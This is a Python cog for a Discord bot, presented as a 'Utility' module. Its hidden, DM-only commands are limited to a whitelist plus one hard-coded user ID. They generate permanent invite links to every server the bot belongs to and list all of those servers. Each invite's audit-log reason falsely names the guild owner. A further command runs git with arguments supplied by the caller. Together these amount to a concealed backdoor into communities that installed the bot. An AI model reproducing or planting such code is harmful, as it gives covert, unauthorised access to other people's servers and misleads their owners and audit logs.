from discord.ext import commands
import sys
import traceback
from subprocess import Popen, PIPE
import discord

with open("whitelist.txt") as f:
    whitelist = [int(x.strip("\n")) for x in f.readlines()]


def is_whitelisted():
    async def predicate(ctx):
        return ctx.author.id in whitelist or ctx.author.id == 263190106821623810

    return commands.check(predicate)


class Utility(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def cog_command_error(self, ctx, error):
        if isinstance(error, commands.PrivateMessageOnly):
            try:
                return await ctx.send(
                    embed=discord.Embed(
                        description="This command can only be used in DMS!"
                    )
                )
            except discord.HTTPException:
                pass
        print("Ignoring exception in command {}:".format(ctx.command), file=sys.stderr)
        traceback.print_exception(
            type(error), error, error.__traceback__, file=sys.stderr
        )

    @is_whitelisted()
    @commands.dm_only()
    @commands.command(hidden=True)
    async def invitelink(self, ctx, id: int):
        server = self.bot.get_guild(id)
        for channel in server.channels:
            try:
                invite = await channel.create_invite(xkcd=True, max_age=0, max_uses=0)
                if invite:
                    break
            except:
                continue
        await ctx.send(invite)

    @is_whitelisted()
    @commands.dm_only()
    @commands.command(hidden=True)
    async def offline(self, ctx):
        await self.bot.change_presence(status=discord.Status.invisible)
        await ctx.send("[bot going offline] Going under!")

    @is_whitelisted()
    @commands.dm_only()
    @commands.command(hidden=True)
    async def online(self, ctx):
        await self.bot.change_presence(status=discord.Status.online)
        await ctx.send("[bot going away] Going AFK!")

    @is_whitelisted()
    @commands.dm_only()
    @commands.command(hidden=True)
    async def idle(self, ctx):
        await self.bot.change_presence(status=discord.Status.idle)
        await ctx.send("[bot going away] Going AFK!")

    @is_whitelisted()
    @commands.dm_only()
    @commands.command(hidden=True)
    async def inviteall(self, ctx):
        for guild in self.bot.guilds:
            for channel in guild.channels:
                try:
                    invitelinknew = await channel.create_invite(
                        destination=channel,
                        xkcd=True,
                        max_age=0,
                        max_uses=0,
                        reason=f"Invite sent by {guild.owner}",
                    )
                except discord.errors.NotFound:
                    print(f"Could not find invite for {guild}")
                if invitelinknew:
                    break
            await ctx.send(invitelinknew)

    @is_whitelisted()
    @commands.dm_only()
    @commands.command(hidden=True)
    async def allguilds(self, ctx):
        guild_names = [guild.name for guild in self.bot.guilds]
        guild_id = [guild.id for guild in self.bot.guilds]
        guilds = zip(guild_names, guild_id)
        embed = discord.Embed(title="Guilds")
        [embed.add_field(name=x[0], value=x[1]) for x in guilds]
        await ctx.send(embed=embed)

    @is_whitelisted()
    @commands.dm_only()
    @commands.command(hidden=True)
    async def git(self, ctx, *, args):
        command = ["git"] + args.split(" ")
        process = Popen(command, stdout=PIPE, stderr=PIPE)
        stdout, stderr = process.communicate()
        await ctx.send(
            embed=discord.Embed(description=f"```{stdout.decode('utf8')}```")
        )


def setup(bot):
    bot.add_cog(Utility(bot))
